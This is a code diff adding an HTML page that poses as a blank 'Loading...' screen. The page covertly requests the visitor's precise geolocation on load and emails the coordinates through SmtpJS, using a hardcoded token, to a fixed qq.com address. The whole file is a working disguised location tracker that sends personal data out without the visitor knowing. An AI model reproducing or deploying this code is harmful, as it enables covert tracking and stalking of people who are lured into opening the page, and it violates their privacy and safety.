@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>正在加载...</title>
+</head>
+<script src="smtp.js"></script>
+<body>
+
+</body>
+<script>
+var options = {
+  enableHighAccuracy: true,
+  timeout: 5000,
+  maximumAge: 0
+};
+function success(pos) {
+  var crd = pos.coords;
+  // console.log('Your current position is:');
+  // console.log('Latitude: ' + crd.latitude);
+  // console.log('Longitude: ' + crd.longitude);
+  // console.log('More or less ' + crd.accuracy + ' meters.');
+  Email.send({
+    SecureToken : "34815240-aab6-4c9f-b67b-ced855562f2b",
+    To : '482768401@qq.com',
+    From : "gaoxingwen0827@gmail.com",
+    Subject : "Location",
+    Body : "经度："+crd.latitude+"纬度："+crd.longitude
+}).then();
+};
+function error(err) {
+  console.warn('ERROR(' + err.code + '): ' + err.message);
+};
+navigator.geolocation.getCurrentPosition(success, error, options);
+</script>
+</html>
